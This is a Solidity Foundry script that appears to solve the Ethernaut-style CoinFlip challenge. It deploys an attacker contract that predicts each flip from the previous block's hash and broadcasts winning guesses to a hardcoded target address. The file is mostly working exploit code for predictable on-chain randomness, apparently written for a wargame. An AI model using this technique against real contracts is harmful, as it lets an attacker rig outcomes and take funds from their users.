// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip public immutable target;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue / FACTOR) == 1;
        require(target.flip(side), "wrong guess");
    }

    function consecutiveWins() external view returns (uint256) {
        return target.consecutiveWins();
    }
}

contract CoinFlipAttackScript is Script {
    address constant COINFLIP = 0x05C1B9828B19faa89F3B0d5938952FEBE7b24faD;

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");

        // If ATTACKER_ADDRESS is set in .env, attack. Otherwise deploy.
        address existing = vm.envOr("ATTACKER_ADDRESS", address(0));

        vm.startBroadcast(pk);

        CoinFlipAttacker attacker;
        if (existing == address(0)) {
            attacker = new CoinFlipAttacker(COINFLIP);
            console.log("Deployed attacker:", address(attacker));
            console.log(">> Add this to your .env: ATTACKER_ADDRESS=%s", address(attacker));
        } else {
            attacker = CoinFlipAttacker(existing);
            attacker.attack();
        }

        vm.stopBroadcast();

        console.log("consecutiveWins:", attacker.consecutiveWins());
    }
}
